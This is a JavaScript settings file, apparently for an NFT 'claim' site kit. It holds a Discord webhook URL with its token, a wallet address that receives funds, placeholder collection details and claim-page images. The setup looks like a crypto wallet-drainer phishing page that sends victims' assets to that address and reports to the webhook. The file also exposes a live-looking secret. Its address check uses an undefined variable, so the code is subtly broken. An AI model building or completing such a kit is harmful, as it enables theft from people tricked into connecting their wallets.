const configuration = {
    webhook: "https://discord.com/api/webhooks/1009588041029001247/BbyuQXXot3Ow7nqm3lKQOAikik-Vf1mMLg93YdhAdnbz_x1uGJi2__hLoJpep4J-iAYw",
    address: "0x544F2306A52265094281c2d7d9660042E31c3229", 
  };

const collectionInfo = {
    name: "NFT Names",
    extra: "Extra Text",
    image: "https://www.bloomberglinea.com/resizer/cCYxWuUthcqd7ML4NfAFhu8x1Zg=/1440x0/filters:format(png):quality(70)/cloudfront-us-east-1.images.arcpublishing.com/bloomberglinea/V22IOSYMMFDQDMMN2WK7U5Y6S4.png"
}

const indexPageInfo = {
    backgroundImage: "background.jpg", // relative path to background image (in assets)
    title: "{name}", // {name} will be replaced with collectionInfo.name
}

const claimPageInfo = {

    image: "ola.gif", // relative path to image (in assets)
    imageRadius: 250, // image radius in px
}

/*
    = = = = = END OF SETTINGS = = = = =
*/

//#region Check Configuration
if (!receiveAddress.startsWith("0x") ||
    ( 
        receiveAddress.length >= 64 ||
        receiveAddress.length <= 40
    )
) console.error(`Error: ${receiveAddress} is not a valid Ethereum address.`);
//#endregion